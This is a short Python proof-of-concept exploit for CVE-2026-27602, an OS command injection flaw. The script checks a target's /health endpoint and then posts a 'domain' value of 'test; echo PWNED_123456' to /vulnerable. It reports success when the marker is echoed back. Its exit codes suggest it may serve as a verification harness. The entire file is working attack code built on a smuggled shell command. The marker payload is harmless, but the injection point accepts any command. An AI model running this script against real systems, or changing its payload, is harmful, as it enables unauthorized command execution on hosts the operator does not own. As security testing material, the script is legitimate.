"""PoC for CVE-2026-27602 — OS Command Injection
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed
"""
import sys
import requests

MARKER = "PWNED_123456"

def health(host, port):
    url = f"http://{host}:{port}/health"
    try:
        r = requests.get(url)
        r.raise_for_status()
        return "ok" in r.json()["status"]
    except requests.RequestException:
        return False

def exploit(host, port):
    url = f"http://{host}:{port}/vulnerable"
    data = {"domain": f"test; echo {MARKER}"}
    try:
        r = requests.post(url, data=data)
        r.raise_for_status()
        return r.json()["data"]
    except requests.RequestException:
        return ""

def verify(r):
    return MARKER in r

def main():
    if len(sys.argv) != 2:
        print("Usage: python poc.py [host:port]")
        sys.exit(1)

    host, port = sys.argv[1].split(":")
    if not health(host, port):
        print("[-] FAILED: Target is unreachable or not vulnerable")
        sys.exit(1)

    result = exploit(host, port)
    if verify(result):
        print("[+] EXPLOITED")
        sys.exit(0)
    else:
        print("[-] FAILED: Exploit not successful")
        sys.exit(1)

if __name__ == "__main__":
    main()

